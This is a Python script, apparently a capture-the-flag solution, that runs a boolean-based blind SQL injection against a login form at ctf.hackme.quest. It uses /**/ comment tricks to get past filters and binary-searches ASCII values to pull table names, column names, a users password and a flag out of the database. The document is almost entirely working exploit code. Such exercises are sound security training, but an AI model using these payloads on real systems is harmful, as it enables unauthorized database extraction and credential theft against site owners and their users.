import requests

url = "https://ctf.hackme.quest/login1/"
password = "test"

def boolean_base_binary_search(index, low, upper):
    mid = 0
    while low <= upper:
        mid = (low + upper)//2
        # print(mid)
        # condition = f'(unicode(substr((select password from users where username="kirito") ,{passwd_index},1))) > {mid}'
        # condition = f'(ascii(substr((SELECT/**/table_name/**/FROM/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1),{index},1)))>{mid}'
        # condition = f'(ascii(substr((SELECT/**/column_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_schema=database()/**/AND/**/table_name=0x3062646235346339383132336635353236636361656439383264323030366139/**/limit/**/0,1),{index},1)))>{mid}'
        ######## length ########
        # condition = f'(length((SELECT/**/4a391a11cfa831ca740cf8d00782f3a6/**/from/**/0bdb54c98123f5526ccaed982d2006a9/**/limit/**/0,1)))>{mid}'
        ######## length ########
        condition = f'(ascii(substr((SELECT/**/4a391a11cfa831ca740cf8d00782f3a6/**/from/**/0bdb54c98123f5526ccaed982d2006a9/**/limit/**/0,1),{index},1)))>{mid}'
        sql = f"\\'/**/or/**/{condition}/**/limit/**/1,1/**/#"
        my_data = {'name': sql, 'password': password}
        r = requests.post(url, data = my_data)
        if "FLAG" in r.text:
            low = mid + 1
        else:
            upper =  mid - 1
    
    condition = f'(ascii(substr((SELECT/**/4a391a11cfa831ca740cf8d00782f3a6/**/from/**/0bdb54c98123f5526ccaed982d2006a9/**/limit/**/0,1),{index},1)))>{mid}'
    sql = f"\\'/**/or/**/{condition}/**/limit/**/1,1/**/#"
    my_data = {'name': sql, 'password': password}
    r = requests.post(url, data = my_data)
    if "FLAG" in r.text:
        mid += 1
    print("target" + str(index) + ":" + chr(mid)+ f"({mid})")
    return chr(mid)

def find_flag():
    flag = ""
    for i in range(1,67):
         flag += boolean_base_binary_search(i, 0, 130)
    return flag


print(f'flag:{find_flag()}')